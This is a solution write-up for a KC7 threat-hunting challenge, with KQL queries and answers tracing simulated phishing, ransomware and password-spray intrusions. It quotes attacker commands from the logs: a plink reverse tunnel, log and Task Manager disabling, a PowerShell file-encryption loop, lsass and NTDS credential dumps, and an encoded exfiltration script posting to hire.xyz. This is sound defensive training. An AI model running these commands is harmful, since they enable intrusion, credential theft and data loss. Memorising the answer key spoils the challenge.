@@ -1,0 +1,587 @@
+The learning objectives in this one promise:
+- Use Azure Data Explorer (ADX) and Kusto Query Language (KQL) to navigate data
+- Investigate a ransomware attack
+- Investigate an attack that relies heavily on lateral movement and privilege escalation
+
+https://kc7cyber.com/challenges/79#
+
+Section 1: KQL 101
+Employees
+| count 
+Answer: 1234
+
+Which employee has the IP address: “10.10.0.40”?
+Employees
+| where ip_addr == "10.10.0.40"
+Answer: Tanisha ODonoghue
+Notes: Email address - tanisha_odonoghue@wdnconsulting.com, username - taodonoghue, role - Chief Strategy Officer, hostname - ZBC6-MACHINE
+
+How many emails did Gloria Gould receive?
+let gloria_email=
+Employees
+| where name == "Gloria Gould"
+| distinct email_addr;
+Email
+| where recipient in (gloria_email)
+| count
+Answer: 45
+
+How many distinct senders were seen in the email logs from kayseeseven.com?
+Email
+| where sender contains "kayseeseven.com"
+| distinct sender
+| count 
+Answer: 3285
+
+How many unique URLs did “Judith Sower” visit?
+let judith_ip=
+Employees
+| where name == "Judith Sower"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (judith_ip)
+| distinct url
+Answer: 96
+
+How many domains in the PassiveDns records contain the word “crypto”?
+PassiveDns
+| where domain contains "crypto"
+| distinct domain
+Answer: 36
+
+What IPs did the domain “cryptocoin.net” resolve to (enter any one of them)?
+PassiveDns
+| where domain == "cryptocoin.net"
+| distinct ip
+Possible answers: 193.46.203.153, 22.160.111.66, 218.51.95.7
+
+How many unique URLs were browsed by employees named “Karen”?
+let karen_ip=
+Employees
+| where name contains "Karen"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (karen_ip)
+| distinct url
+Answer: 290
+
+
+Section 2: Something Phishy
+You notice that several security alerts were generated for a file named freebitcoin.exe. How many of these alerts were reported?
+SecurityAlerts
+| where description contains "freebitcoin.exe"
+Answer: 9
+
+When was the first alert reported?
+6/5/2023, 1:16:37 PM
+
+Which host was this first alert associated with?
+QU09-DESKTOP
+
+Which employee does this host belong to?
+Employees
+| where hostname == "QU09-DESKTOP"
+Answer: James Reinhart
+
+Check the host for processes created around the time the alert was reported. One of these processes involves the system registry. What is this command?
+ProcessEvents
+| where hostname == "QU09-DESKTOP"
+| where process_commandline contains "reg"
+Answer: reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s
+
+This command (the one from Q5) is used to get information about all the __ that has been installed using Windows Installer on the system.
+Answer: Software
+
+A few minutes after this command was run, ipconfig was used to retrieve information about the network configuration of the system. What parameter/switch was used with ipconfig?
+ProcessEvents
+| where hostname == "QU09-DESKTOP"
+| where timestamp > datetime(6/5/2023, 11:53:37 AM)
+Answer: all
+
+Several other commands were run on this host around the time freebitcoin.exe appeared, including: whoami, net use, systeminfo, and arp -a. These commands likely represent what MITRE ATT&CK tactic? (this is one word)
+Answer: discovery
+
+The adversary may have used a tool to establish a tunnel to remote infrastructure. What is the name of the tool used on this host to establish a tunnel?
+Answer: plink
+
+What IP address did this tool connect to?
+The full command is: "powershell.exe" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 81.192.242.254 -P 22 -l bitcoinminer -pw Crypto$123 -no-antispoof
+Answer: 81.192.242.254
+(127.0.0.1 is the loopback address for the local host)
+
+What password was used to establish the tunnel?
+Answer: Crypto$123
+
+What was the name of the file created on this host shortly before freebitcoin.exe was created?
+Get the timestamp for freebitcoin.exe creation:
+FileCreationEvents
+| where hostname == "QU09-DESKTOP"
+| where filename contains "freebitcoin.exe"
+6/5/2023, 1:10:22 PM
+Then, see what was created just before that:
+FileCreationEvents
+| where hostname == "QU09-DESKTOP"
+| where timestamp < datetime(6/5/2023, 1:10:22 PM)
+| sort by timestamp desc 
+Answer: HaveYouHeardAboutDogeCoin.docx
+
+What is the SHA256 hash of this file?
+Answer: a8145d4fd1534976e060cf8d0e4e206cda61d53f3d3c7f8bb29874532fef8d72
+
+What is the name of the process that created this file?
+Answer: edge.exe
+
+What URL did this employee click to download the file?
+let host_ip=
+Employees
+| where hostname == "QU09-DESKTOP"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (host_ip)
+| where url contains "HaveYouHeardAboutDogeCoin.docx"
+Answer: http://forex-monero.com/files/HaveYouHeardAboutDogeCoin.docx
+
+What email address was used to send this link to the user?
+let email=
+Employees
+| where hostname == "QU09-DESKTOP"
+| distinct email_addr;
+Email
+| where recipient in (email)
+| where link == "http://forex-monero.com/files/HaveYouHeardAboutDogeCoin.docx"
+Answer: freedom@hotmail.com
+
+What was the subject line of this email?
+Answer: [EXTERNAL] [IMPORTANT] High-Priority Message: Secure Your Bitcoin Holdings.
+
+That subject line definitely looks suspicious. This likely represents a __ attack.
+Answer: Phishing
+
+What was the verdict for this email?
+Answer: CLEAN
+That's why it got to the user instead of being stopped at an email filter (if there is one in place). A detection rule needs tuning.
+
+How many other users received emails from this sender email address?
+Email
+| where sender == "freedom@hotmail.com"
+| distinct recipient
+| count
+Answer: 40
+
+When was the first email sent from this sender?
+Answer: 6/5/2023, 12:59:06 PM
+
+When was the last email sent from this sender?
+Answer: 8/2/2023, 11:58:16 AM
+
+How many different email subjects were used by this sender?
+Email
+| where sender == "freedom@hotmail.com"
+| distinct subject
+| count
+Answer: 5
+
+Which subject line was used by this sender to target the most employees?
+Grab the subjects:
+Email
+| where sender == "freedom@hotmail.com"
+| distinct subject
+[EXTERNAL] Urgent: Claim Your Free Bitcoin Now!, [EXTERNAL] RE:RE: Action Required: Receive Your Bitcoin Payment., [EXTERNAL] FW: Action Required: Receive Your Bitcoin Payment., [EXTERNAL] [IMPORTANT] High-Priority Message: Secure Your Bitcoin Holdings., [EXTERNAL] Emergency Bitcoin Strategy Activation.
+Email
+| where sender == "freedom@hotmail.com"
+| where subject == "[EXTERNAL] Urgent: Claim Your Free Bitcoin Now!" //Edit this as needed
+| count
+Totals in order: 4, 6, 6, 14, 10
+Answer: [EXTERNAL] [IMPORTANT] High-Priority Message: Secure Your Bitcoin Holdings.
+
+How many total employees received emails with the subjects you found in question 23?
+Email
+| where subject has_any ("[EXTERNAL] Urgent: Claim Your Free Bitcoin Now!", "[EXTERNAL] RE:RE: Action Required: Receive Your Bitcoin Payment.", "[EXTERNAL] FW: Action Required: Receive Your Bitcoin Payment.", "[EXTERNAL] [IMPORTANT] High-Priority Message: Secure Your Bitcoin Holdings.", "[EXTERNAL] Emergency Bitcoin Strategy Activation.")
+| distinct recipient
+Answer: 109
+
+How many total employees received emails from this threat actor?
+Email
+| where subject has_any ("[EXTERNAL] Urgent: Claim Your Free Bitcoin Now!", "[EXTERNAL] RE:RE: Action Required: Receive Your Bitcoin Payment.", "[EXTERNAL] FW: Action Required: Receive Your Bitcoin Payment.", "[EXTERNAL] [IMPORTANT] High-Priority Message: Secure Your Bitcoin Holdings.", "[EXTERNAL] Emergency Bitcoin Strategy Activation.")
+| distinct sender
+This gives us multiple sender addresses: freedom@hotmail.com, profit.podcast@hotmail.com, profitprofit@protonmail.com, moon.doge@qq.com, podcastprofit@verizon.com
+Email
+| where sender has_any ("freedom@hotmail.com", "profit.podcast@hotmail.com", "profitprofit@protonmail.com", "moon.doge@qq.com", "podcastprofit@verizon.com")
+| distinct recipient
+Answer: 242
+
+How many distinct domains did the actor use in their emails?
+Email
+| where sender has_any ("freedom@hotmail.com", "profit.podcast@hotmail.com", "profitprofit@protonmail.com", "moon.doge@qq.com", "podcastprofit@verizon.com")
+| distinct link
+Answer: 24
+
+Which of the domains used by the actor was used most often?
+Answer: bro-monero.com
+
+How many total IPs did the domains used by the actor resolve to?
+PassiveDns
+| where domain has_any ("crypto-bro.org", "coin-forex.org", "coinbit.org", "bro-coin.org", "cryptocoin.org", "bromonero.org", "brobit.org", "crypto-coin.org", "forexbit.org", "bit-monero.org", "brocoin.org", "coin-monero.com", "bro-monero.com", "forex-monero.com", "forexbit.com", "coin-bit.com", "crypto-bit.com", "cryptobit.com", "cryptobit.net", "cryptocoin.net", "coinforex.net", "monero-bit.net", "bro-bit.net", "coinmonero.net")
+| distinct ip
+Answer: 35
+
+How many total domains were hosted on these IPs?
+PassiveDns
+| where domain has_any ("crypto-bro.org", "coin-forex.org", "coinbit.org", "bro-coin.org", "cryptocoin.org", "bromonero.org", "brobit.org", "crypto-coin.org", "forexbit.org", "bit-monero.org", "brocoin.org", "coin-monero.com", "bro-monero.com", "forex-monero.com", "forexbit.com", "coin-bit.com", "crypto-bit.com", "cryptobit.com", "cryptobit.net", "cryptocoin.net", "coinforex.net", "monero-bit.net", "bro-bit.net", "coinmonero.net")
+| distinct ip;
+PassiveDns
+| where ip in (ips)
+| distinct domain
+Answer: 97
+
+Which IP hosted the most actor domains?
+let ips=
+PassiveDns
+| where domain has_any ("crypto-bro.org", "coin-forex.org", "coinbit.org", "bro-coin.org", "cryptocoin.org", "bromonero.org", "brobit.org", "crypto-coin.org", "forexbit.org", "bit-monero.org", "brocoin.org", "coin-monero.com", "bro-monero.com", "forex-monero.com", "forexbit.com", "coin-bit.com", "crypto-bit.com", "cryptobit.com", "cryptobit.net", "cryptocoin.net", "coinforex.net", "monero-bit.net", "bro-bit.net", "coinmonero.net")
+| distinct ip;
+PassiveDns
+| where ip in (ips)
+| summarize dcount(domain) by ip
+Answer: 135.55.0.219
+
+How many domains are hosted on that IP?
+Answer: 22
+
+How many devices in our environment tunneled to one of these known actor IPs?
+ProcessEvents
+| where process_commandline has "plink" and process_commandline has_any ("135.55.0.219", "193.46.203.153", "131.78.184.82", "8.229.238.43", "81.192.242.254", "213.236.233.245", "153.216.223.94", "199.240.120.188", "168.24.157.225", "207.217.180.29", "219.90.149.70", "130.228.192.70", "153.236.28.188", "6.185.92.83", "175.226.28.62", "134.229.177.133", "164.140.79.6", "63.69.110.184", "22.160.111.66", "97.45.238.177", "216.48.234.55", "72.245.0.200", "142.125.145.120", "214.207.54.7", "141.58.200.13", "170.43.187.12", "189.208.204.159", "220.130.162.221", "223.59.122.53", "212.0.9.253", "218.51.95.7", "194.55.110.209", "205.187.191.207", "26.238.102.50", "206.210.182.33")
+| distinct hostname
+Answer: 200
+
+Which actor IP was tunneled to by 9 hosts?
+ProcessEvents
+| where process_commandline has "plink" and process_commandline has_any ("135.55.0.219", "193.46.203.153", "131.78.184.82", "8.229.238.43", "81.192.242.254", "213.236.233.245", "153.216.223.94", "199.240.120.188", "168.24.157.225", "207.217.180.29", "219.90.149.70", "130.228.192.70", "153.236.28.188", "6.185.92.83", "175.226.28.62", "134.229.177.133", "164.140.79.6", "63.69.110.184", "22.160.111.66", "97.45.238.177", "216.48.234.55", "72.245.0.200", "142.125.145.120", "214.207.54.7", "141.58.200.13", "170.43.187.12", "189.208.204.159", "220.130.162.221", "223.59.122.53", "212.0.9.253", "218.51.95.7", "194.55.110.209", "205.187.191.207", "26.238.102.50", "206.210.182.33")
+| summarize dcount(hostname) by process_commandline
+The one with 9 is: "powershell.exe" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 193.46.203.153 -P 22 -l bitcoinminer -pw Crypto$123 -no-antispoof
+Answer: 193.46.203.153
+
+Which IP did anbartlett's host tunnel to?
+let anhost=
+Employees
+| where username == "anbartlett"
+| distinct hostname;
+ProcessEvents
+| where hostname in (anhost)
+| where process_commandline has "plink" and process_commandline has_any ("135.55.0.219", "193.46.203.153", "131.78.184.82", "8.229.238.43", "81.192.242.254", "213.236.233.245", "153.216.223.94", "199.240.120.188", "168.24.157.225", "207.217.180.29", "219.90.149.70", "130.228.192.70", "153.236.28.188", "6.185.92.83", "175.226.28.62", "134.229.177.133", "164.140.79.6", "63.69.110.184", "22.160.111.66", "97.45.238.177", "216.48.234.55", "72.245.0.200", "142.125.145.120", "214.207.54.7", "141.58.200.13", "170.43.187.12", "189.208.204.159", "220.130.162.221", "223.59.122.53", "212.0.9.253", "218.51.95.7", "194.55.110.209", "205.187.191.207", "26.238.102.50", "206.210.182.33")
+Answer: 189.208.204.159
+
+Which command did the attackers run to stop the Windows Event Log Service?
+ProcessEvents
+| where process_commandline has "stop"
+| distinct process_commandline
+Answer: net stop eventlog /y
+
+Shortly after this, the attackers modified a registry entry to disable a Windows feature. Which tool was it?
+The first time that was run was on 8/10/2023, 3:57:34 PM on host ETSI-DESKTOP
+ProcessEvents
+| where hostname == "ETSI-DESKTOP"
+| where timestamp > datetime(8/10/2023, 3:57:34 PM)
+There is a result showing: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
+Answer: TaskMgr
+
+Next, the attackers used sc to change the startup behavior of a service. Which service was it?
+There is a result: sc config TermService start= auto
+Answer: TermService
+
+Which command did the attackers then use to encrypt files?
+This was first run on host WOQT-MACHINE at 8/10/2023, 3:54:42 PM, as seen by using:
+ProcessEvents
+| where process_commandline contains "sc config TermService start= auto"
+Then:
+ProcessEvents
+| where hostname == "WOQT-MACHINE"
+| where timestamp > datetime(8/10/2023, 3:54:42 PM)
+Answer: powershell.exe -c "Get-ChildItem C:\ -File -Recurse | Foreach-Object { $_.FullName } | ForEach-Object { Encrypt-File $_ }"
+
+In what kind of attack does an adversary encrypt a victim's files?
+Answer: ransomware
+
+Let's see if any suspicious files were created around the time the encryption command was executed. What is the name of this file?
+FileCreationEvents
+| where hostname == "WOQT-MACHINE"
+| where timestamp > datetime(8/10/2023, 3:54:42 PM)
+Answer: GIVE_US_YOUR_BITCOIN.txt
+
+What is the SHA256 hash of this file?
+Answer: 1f9d90d4a6145cfc4061a5a19004f951c2e2e5fb57ce69ccf8e516f524e2e669
+
+On how many unique hosts was this file seen?
+FileCreationEvents
+| where sha256 == "1f9d90d4a6145cfc4061a5a19004f951c2e2e5fb57ce69ccf8e516f524e2e669"
+| distinct hostname
+Answer: 80
+
+On what date was this file seen in our environment?
+Answer: 2023-08-10
+
+Let's look at all the affected hosts. How many different employee roles were affected by this?
+let inf_hosts=
+FileCreationEvents
+| where sha256 has "1f9d90d4a6145cfc4061a5a19004f951c2e2e5fb57ce69ccf8e516f524e2e669"
+| distinct hostname;
+Employees
+| where hostname in (inf_hosts)
+| distinct role
+Answer: 9
+
+Which employee role was most affected by the ransomware attack?
+let inf_hosts=
+FileCreationEvents
+| where sha256 has "1f9d90d4a6145cfc4061a5a19004f951c2e2e5fb57ce69ccf8e516f524e2e669"
+| distinct hostname;
+Employees
+| where hostname in (inf_hosts)
+| summarize dcount(hostname) by role
+Answer: Domination Minion
+
+One IT analyst was affected. What is this employee's name?
+let inf_hosts=
+FileCreationEvents
+| where sha256 has "1f9d90d4a6145cfc4061a5a19004f951c2e2e5fb57ce69ccf8e516f524e2e669"
+| distinct hostname;
+Employees
+| where hostname in (inf_hosts)
+| where role == "IT Analyst"
+| distinct name
+Answer: Walter Gomez
+
+
+
+Section 3: Getting Smarter
+Robert Russell reported seeing prompts for failed logins against his account, your manager wants you to investigate. What IP address does Robert usually use to login to his mail account?
+Employees
+| where name == "Robert Russell"
+| distinct ip_addr
+Answer: 10.10.4.55
+
+What is the most common public IP used by Robert Russell?
+AuthenticationEvents
+| where username == "rorussell"
+| summarize dcount(hostname) by src_ip
+Answer: 48.147.171.98
+
+You are unsure if this IP address is actually suspicious. What user agent did Robert show when logging in from that public IP? Just enter the last piece (e.g. Firefox/##.#)
+AuthenticationEvents
+| where username == "rorussell"
+| where src_ip == "48.147.171.98"
+Answer: Firefox/46.0
+
+We want to determine whether we shoud be concerned about that. Let's compare this user agent to the user's typical user agent. What is Robert Russell typical user agent (per the Employees table)? Just enter the last piece (e.g. Firefox/##.#)
+Answer: Firefox/46.0
+
+Ok that's probably just Russell logging in while working from home or something. What is the second most common user agent that we see being used to login to Russell's account? Just enter the last piece (e.g. Firefox/##.#)
+AuthenticationEvents
+| where username == "rorussell"
+| distinct user_agent
+Answer: Firefox/69.0
+
+How many different IPs were used in attempted logins to Russell's account via that second user agent?
+AuthenticationEvents
+| where username == "rorussell"
+| where user_agent contains "Firefox/69.0"
+| distinct src_ip
+Answer: 20
+
+How many of those attempted logins succeeded?
+AuthenticationEvents
+| where username == "rorussell"
+| where user_agent contains "Firefox/69.0"
+| where result contains "successful"
+| count
+Answer: 0
+
+How many different passwords were tried against Russell's accounts via that second user agent?
+AuthenticationEvents
+| where username == "rorussell"
+| where user_agent contains "Firefox/69.0"
+| distinct password_hash
+Answer: 15
+
+It looks like a malicious actor is trying to guess a bunch of passwords against Russell's account. This is known as a _ attack.
+Answer: password spray
+
+How many different accounts did the threat actor try this attack against?
+AuthenticationEvents
+| where user_agent contains "Firefox/69.0"
+| distinct username
+Answer: 316
+
+How many accounts were successfully logged into via that user agent?
+AuthenticationEvents
+| where user_agent contains "Firefox/69.0"
+| where result contains "successful"
+| distinct username
+Answer: 12
+
+What is the username of the first user to be compromised in this password spray?
+AuthenticationEvents
+| where user_agent contains "Firefox/69.0"
+| where result contains "successful"
+Answer: mibohringer
+
+When was that user compromised? (Copy and paste the timestamp)
+Answer: 6/9/2023, 12:03:56 PM
+
+3 days later, the attacker ran a discovery command on that first victim's machine to find out who they are. What is this 6-letter command?
+Answer: whoami
+
+Let's look at another one of the accounts that was sprayed - caanderson. What is this user's hostname?
+Employees
+| where username == "caanderson"
+Answer: Q68K-MACHINE
+
+What command did the attacker run to dump credentials?
+ProcessEvents
+| where hostname == "Q68K-MACHINE"
+| where timestamp > datetime(6/9/2023, 12:03:56 PM)
+| where process_commandline contains "dump"
+Answer: procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
+
+What is the username of the admin account that logged into this host?
+AuthenticationEvents
+| where hostname == "Q68K-MACHINE"
+| distinct username
+Answer: lifehack_local_admin
+
+How many hosts did this account attempt to log into?
+AuthenticationEvents
+| where username == "lifehack_local_admin"
+| distinct hostname
+Answer: 200
+
+On how many hosts were those logins successful?
+AuthenticationEvents
+| where username == "lifehack_local_admin"
+| where result contains "successful"
+| distinct hostname
+Answer: 200
+
+How many total hosts did the attackers dump credentials on?
+ProcessEvents
+| where process_commandline contains "lsass.dmp"
+| distinct hostname
+Answer: 61
+
+How many local admin accounts logged into these hosts?
+let comp_hosts=
+ProcessEvents
+| where process_commandline contains "lsass.dmp"
+| distinct hostname;
+AuthenticationEvents
+| where hostname in (comp_hosts)
+| where username contains "local_admin"
+| where result contains "successful"
+| distinct username
+Answer: 10
+
+How many domain admins logged into all of these hosts that had credentials dumped on them?
+let comp_hosts=
+ProcessEvents
+| where process_commandline contains "lsass.dmp"
+| distinct hostname;
+AuthenticationEvents
+| where hostname in (comp_hosts)
+| where username contains "domain_admin"
+| where result contains "successful"
+| distinct username
+Answer: 1
+
+What is the username of this domain admin account?
+Answer: cacapley_domain_admin
+
+What is the hostname of the server logged into by this domain admin?
+AuthenticationEvents
+| where username == "cacapley_domain_admin"
+| distinct hostname
+Answer: DOMAIN_CONTROLLER_01
+
+The attackers used mkdir on this host to create a new directory. What is the full path of the directory they created?
+ProcessEvents
+| where hostname == "DOMAIN_CONTROLLER_01"
+| where process_commandline contains "mkdir"
+Answer: C:\Windows\Temp\Ntds_dit
+
+The attackers ran a command on this host to dump directory-wide credentials. What was the full command?
+ProcessEvents
+| where hostname == "DOMAIN_CONTROLLER_01"
+| where process_commandline contains "C:\\Windows\\Temp\\Ntds_dit"
+Answer: ntdsutil "ac i ntds "ifm" "create full C:\Windows\Temp\Ntds_dit" q q 
+
+What command can be used to force update the group policy on an endpoint?
+Answer: gpupdate /force
+
+How many hosts was the gpupdate command run on?
+ProcessEvents
+| where process_commandline contains "gpupdate /force"
+| distinct hostname
+Answer: 1233
+
+What is the CEO's hostname?
+Employees
+| where role == "CEO"
+Answer: ODWU-LAPTOP
+
+What time was the group policy update command run on this host?
+ProcessEvents
+| where hostname == "ODWU-LAPTOP"
+| where process_commandline contains "gpupdate /force"
+Answer: 7/17/2023, 4:03:40 PM
+
+A few days after the group policy update on this host, a strange powershell command was run. What encoding scheme is used in this command?
+ProcessEvents
+| where hostname == "ODWU-LAPTOP"
+| where timestamp > datetime(7/17/2023, 4:03:40 PM)
+| where process_commandline contains "powershell"
+Answer: Base64
+
+Decode this encoded command. What is the destination URL in this decoded script?
+The original command is: C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc JHNvdXJjZVBhdGggPSAnQzpcVXNlcnNcRGVza3RvcFx0ZW1hcnRpblxleGZpbFwnICAjIFNvdXJjZSBmb2xkZXIKJGRlc3RpbmF0aW9uVVJMID0gJ2h0dHA6Ly9oaXJlLnh5ei9leGZpbC8nICAjIERlc3RpbmF0aW9uIFVSTAoKIyBHZXQgYWxsIGZpbGVzIHJlY3Vyc2l2ZWx5IGluIHRoZSBzb3VyY2UgZGlyZWN0b3J5CiRmaWxlcyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggJHNvdXJjZVBhdGggLUZpbGUgLVJlY3Vyc2UKCiMgSXRlcmF0ZSB0aHJvdWdoIGVhY2ggZmlsZSBhbmQgc2VuZCB0byB0aGUgZXh0ZXJuYWwgbG9jYXRpb24KZm9yZWFjaCAoJGZpbGUgaW4gJGZpbGVzKSB7CiAgICAkZmlsZVBhdGggPSAkZmlsZS5GdWxsTmFtZQogICAgJGRlc3RpbmF0aW9uID0gJGRlc3RpbmF0aW9uVVJMICsgJGZpbGUuTmFtZQoKICAgICMgVXNlIEludm9rZS1SZXN0TWV0aG9kIHRvIHNlbmQgdGhlIGZpbGUgdmlhIEhUVFAgUE9TVAogICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkZGVzdGluYXRpb24gLU1ldGhvZCBQb3N0IC1JbkZpbGUgJGZpbGVQYXRoCn0K
+Decoded, the answer is: destinationURL = http://hire.xyz/exfil/
+
+What is the source path in this decoded script?
+Answer: C:\Users\Desktop\temartin\exfil\
+
+Check for a file on this host in the path you found in Q33. What is the Sha256 hash of this file?
+FileCreationEvents
+| where hostname == "ODWU-LAPTOP"
+| where path contains "C:\\Users\\Desktop\\temartin\\exfil\\"
+Answer: fe4bda7bd7252bcae343788e21ece59ac308956666e5d03be83e355aa4b49bbd
+
+How many total hosts in the organization had similar file paths?
+FileCreationEvents
+| where path contains "\\exfil\\"
+| distinct hostname
+Answer: 12
+
+How many unique employee roles had data exfiltrated from their devices?
+let comp_hosts=
+FileCreationEvents
+| where path contains "\\exfil\\"
+| distinct hostname;
+Employees
+| where hostname in (comp_hosts)
+| distinct role
+Answer: 3
+
+How many Directors of Operations were targeted?
+let comp_hosts=
+FileCreationEvents
+| where path contains "\\exfil\\"
+| distinct hostname;
+Employees
+| where hostname in (comp_hosts)
+| summarize dcount(hostname) by role
+Answer: 10
+
+
+
+
+
+
+
+
